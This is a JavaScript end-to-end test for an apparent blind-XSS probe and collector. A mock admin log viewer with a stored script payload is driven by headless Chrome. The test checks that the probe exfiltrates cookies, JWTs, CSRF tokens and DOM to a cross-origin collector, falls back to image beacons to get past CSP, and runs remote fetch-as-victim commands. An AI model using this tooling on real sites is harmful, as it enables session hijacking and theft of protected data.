// Real end-to-end test. Runs the actual worker.js on one origin (:8787) as the
// collector, a mock vulnerable "admin log viewer" app on another origin (:9090),
// and drives HEADLESS CHROME as the victim so the probe's real browser JS executes.
// Verifies: probe fires -> collects real DOM/cookies/storage -> cross-origin exfil
// -> interactive fetch-as-victim reads a protected same-origin page with the victim's cookie.
import http from 'node:http';
import { spawn } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import worker from '../src/worker.js';
import { makeEnv } from './env.mjs';

const CHROME = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const COLLECTOR = 8787, VICTIM = 9090, CDP = 9222;
const env = makeEnv('testkey');
let pass = 0, fail = 0;
const ok = (n, c, x) => { if (c) { pass++; console.log('  PASS', n); } else { fail++; console.log('  FAIL', n, x != null ? '-> ' + JSON.stringify(x).slice(0, 300) : ''); } };
const sleep = ms => new Promise(r => setTimeout(r, ms));

// ---- collector server: wrap the real worker.fetch ----
const collector = http.createServer(async (nreq, nres) => {
  if (process.env.BXDEBUG) console.log('   [collector]', nreq.method, nreq.url.slice(0, 70));
  const chunks = []; for await (const c of nreq) chunks.push(c);
  const body = chunks.length ? Buffer.concat(chunks) : undefined;
  const wreq = new Request('http://127.0.0.1:' + COLLECTOR + nreq.url,
    { method: nreq.method, headers: nreq.headers, body: (nreq.method === 'GET' || nreq.method === 'HEAD') ? undefined : body });
  const wres = await worker.fetch(wreq, env);
  const buf = Buffer.from(await wres.arrayBuffer());
  nres.writeHead(wres.status, Object.fromEntries(wres.headers));
  nres.end(buf);
});

// ---- mock vulnerable app (the "victim" side) ----
const victimApp = http.createServer((req, res) => {
  if (req.url.startsWith('/admin/logs')) {
    // simulates a stored blind-XSS payload rendered in a staff log viewer
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><title>Admin Log Viewer</title>
<script>document.cookie='adminsess=SECRET-COOKIE-77; path=/'; localStorage.setItem('jwt','ey.ADMIN.tok');</script>
<form><input type=hidden name=csrf value=CSRF-TOKEN-9></form>
<h1>Support ticket #4211</h1>
<div class=ticket><!-- attacker-stored value, rendered unescaped in staff panel: -->
<script src="http://127.0.0.1:${COLLECTOR}/c/tE2E-supportticket"></script>
</div>`);
  } else if (req.url.startsWith('/admin/csp')) {
    // CSP allows loading the probe script + images to the collector, but blocks
    // fetch/sendBeacon (connect-src 'self') -> forces the image-beacon fallback.
    res.writeHead(200, {
      'Content-Type': 'text/html',
      'Set-Cookie': 'cspcookie=CSP-COOKIE-9; path=/',
      'Content-Security-Policy': `default-src 'self'; script-src 'self' http://127.0.0.1:${COLLECTOR}; img-src *; connect-src 'self'`
    });
    res.end(`<!doctype html><title>CSP Log Viewer</title><h1>ticket #9000 under CSP</h1>
<div><script src="http://127.0.0.1:${COLLECTOR}/c/tCSP-strict"></script></div>`);
  } else if (req.url.startsWith('/admin/secret')) {
    // protected: only returns the secret if the victim's cookie rides along
    const authed = (req.headers.cookie || '').includes('adminsess=SECRET-COOKIE-77');
    res.writeHead(authed ? 200 : 403, { 'Content-Type': 'text/plain' });
    res.end(authed ? 'TOP-SECRET-ADMIN-DATA: all users exported' : 'forbidden');
  } else { res.writeHead(404); res.end(); }
});

// ---- minimal CDP over the DevTools websocket (no puppeteer) ----
async function cdp(method, params) {
  const v = await (await fetch(`http://127.0.0.1:${CDP}/json/version`)).json();
  const ws = new WebSocket(v.webSocketDebuggerUrl);
  await new Promise((res, rej) => { ws.onopen = res; ws.onerror = rej; });
  const out = await new Promise((res) => {
    ws.onmessage = e => { const m = JSON.parse(e.data); if (m.id === 1) res(m); };
    ws.send(JSON.stringify({ id: 1, method, params }));
  });
  ws.close(); return out;
}
async function waitChrome() { for (let i = 0; i < 50; i++) { try { await fetch(`http://127.0.0.1:${CDP}/json/version`); return true; } catch { await sleep(200); } } return false; }

let chrome;
try {
  await new Promise(r => collector.listen(COLLECTOR, r));
  await new Promise(r => victimApp.listen(VICTIM, r));
  const prof = mkdtempSync(join(tmpdir(), 'bxss-chrome-'));
  chrome = spawn(CHROME, ['--headless=new', '--disable-gpu', '--no-first-run', '--no-default-browser-check',
    `--user-data-dir=${prof}`, `--remote-debugging-port=${CDP}`, 'about:blank'], { stdio: 'ignore' });
  ok('chrome launched', await waitChrome());

  // open the victim page (stored payload fires the probe)
  await cdp('Target.createTarget', { url: `http://127.0.0.1:${VICTIM}/admin/logs` });

  // wait for the initial report
  let sid = null;
  for (let i = 0; i < 40; i++) {
    const rows = env._raw.prepare("SELECT * FROM reports WHERE token='tE2E-supportticket' ORDER BY id DESC").all();
    if (rows.length) { sid = rows[0].sid; var report = rows[0]; break; }
    await sleep(250);
  }
  ok('probe fired + report received in real browser', !!sid);
  if (sid) {
    ok('collected victim cookie (real document.cookie)', report.cookies.includes('adminsess=SECRET-COOKIE-77'), report.cookies);
    ok('collected localStorage (real)', (report.storage || '').includes('ey.ADMIN.tok'), report.storage);
    ok('collected hidden CSRF input (real DOM)', (report.forms || '').includes('CSRF-TOKEN-9'), report.forms);
    ok('captured real DOM snapshot', (report.dom || '').includes('Support ticket #4211'));
    ok('fire URL identifies the victim page', report.url.includes('/admin/logs'), report.url);

    // interactive: read a protected same-origin page AS THE VICTIM
    await fetch(`http://127.0.0.1:${COLLECTOR}/api/cmd?key=testkey`,
      { method: 'POST', body: JSON.stringify({ sid, cmd: 'fetch:/admin/secret' }) });
    let result = null;
    for (let i = 0; i < 40; i++) {                    // probe polls every 5s
      const c = env._raw.prepare("SELECT * FROM commands WHERE sid=? AND status='done'").get(sid);
      if (c) { result = c.result; break; }
      await sleep(500);
    }
    ok('fetch-as-victim executed + returned', !!result, result);
    ok('fetch-as-victim read PROTECTED data with victim cookie', !!result && result.includes('TOP-SECRET-ADMIN-DATA'), result);
  }

  // ---- CSP phase: connect-src blocks fetch/sendBeacon; image-beacon must still deliver ----
  await cdp('Target.createTarget', { url: `http://127.0.0.1:${VICTIM}/admin/csp` });
  let csp = null;
  for (let i = 0; i < 60; i++) {
    const rows = env._raw.prepare("SELECT * FROM reports WHERE token='tCSP-strict' ORDER BY id DESC").all();
    if (rows.length) { csp = rows[0]; break; }
    await sleep(300);
  }
  ok('CSP-blocked probe still exfil’d via image-beacon fallback', !!csp, csp && csp.url);
  if (csp) {
    ok('image-beacon report identifies the fired URL', csp.url.includes('/admin/csp'), csp.url);
    ok('image-beacon report dropped DOM (compact)', /"dom_omitted":true/.test(csp.meta || '') || csp.dom === '' || csp.dom == null, { dom: csp.dom, meta: csp.meta });
    ok('image-beacon still captured the cookie', (csp.cookies || '').includes('cspcookie=CSP-COOKIE-9'), csp.cookies);
  }
} catch (e) {
  console.log('  ERROR', e && e.stack || e); fail++;
} finally {
  if (chrome) chrome.kill();
  collector.close(); victimApp.close();
  console.log(`\nE2E RESULT: ${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
}
